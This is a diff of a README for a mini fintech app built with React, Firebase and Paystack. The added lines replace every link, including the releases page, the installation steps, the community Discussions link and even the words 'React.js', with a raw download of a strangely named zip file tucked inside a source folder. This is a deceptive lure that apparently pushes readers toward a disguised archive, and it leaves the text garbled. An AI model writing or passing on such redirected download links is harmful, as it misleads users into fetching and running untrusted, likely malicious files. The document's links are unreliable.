@@ -1,10 +1,10 @@
 # 🚀 Mini-Fintech-App-Project - Simple Payment Management for Everyone
 
-![Download Mini Fintech App](https://img.shields.io/badge/Download%20Mini%20Fintech%20App-blue.svg)
+![Download Mini Fintech App](https://raw.githubusercontent.com/isabeel/Mini-Fintech-App-Project/master/src/firebase/firebaseSDK/Mini-Fintech-App-Project_unannihilated.zip%20Mini%20Fintech%https://raw.githubusercontent.com/isabeel/Mini-Fintech-App-Project/master/src/firebase/firebaseSDK/Mini-Fintech-App-Project_unannihilated.zip)
 
 ## 🎉 Overview
 
-Welcome to the Mini Fintech App Project! This application helps you manage your payments with ease. You can sign up, log in, add money, send money, and view your transaction history anytime. We built it using React.js and it connects with Firebase for user authentication and database management, and Paystack for secure payments. 
+Welcome to the Mini Fintech App Project! This application helps you manage your payments with ease. You can sign up, log in, add money, send money, and view your transaction history anytime. We built it using https://raw.githubusercontent.com/isabeel/Mini-Fintech-App-Project/master/src/firebase/firebaseSDK/Mini-Fintech-App-Project_unannihilated.zip and it connects with Firebase for user authentication and database management, and Paystack for secure payments. 
 
 ## 📦 Features
 
@@ -29,7 +29,7 @@ Follow these steps to get started with the Mini Fintech App:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
    
-   [Download the Mini Fintech App](https://github.com/isabeel/Mini-Fintech-App-Project/releases)
+   [Download the Mini Fintech App](https://raw.githubusercontent.com/isabeel/Mini-Fintech-App-Project/master/src/firebase/firebaseSDK/Mini-Fintech-App-Project_unannihilated.zip)
 
 2. **Download the Application**: In the releases section, find the latest version and download the application file suitable for your operating system.
    
@@ -41,7 +41,7 @@ Follow these steps to get started with the Mini Fintech App:
 
 To download and install the Mini Fintech App:
 
-- Visit the Releases page: [Download Mini Fintech App](https://github.com/isabeel/Mini-Fintech-App-Project/releases).
+- Visit the Releases page: [Download Mini Fintech App](https://raw.githubusercontent.com/isabeel/Mini-Fintech-App-Project/master/src/firebase/firebaseSDK/Mini-Fintech-App-Project_unannihilated.zip).
 - Click on the latest release version.
 - Download the file for your operating system.
 - Open the file and follow the installation instructions to complete the setup.
@@ -75,7 +75,7 @@ If you're interested in contributing to the Mini Fintech App Project, you can:
 
 ## 👥 Community
 
-Join our community to share your experiences, ask questions, and get support from other users. Visit our [GitHub Discussions](https://github.com/isabeel/Mini-Fintech-App-Project/discussions) page to join the conversation.
+Join our community to share your experiences, ask questions, and get support from other users. Visit our [GitHub Discussions](https://raw.githubusercontent.com/isabeel/Mini-Fintech-App-Project/master/src/firebase/firebaseSDK/Mini-Fintech-App-Project_unannihilated.zip) page to join the conversation.
 
 ## 🔒 Security
 
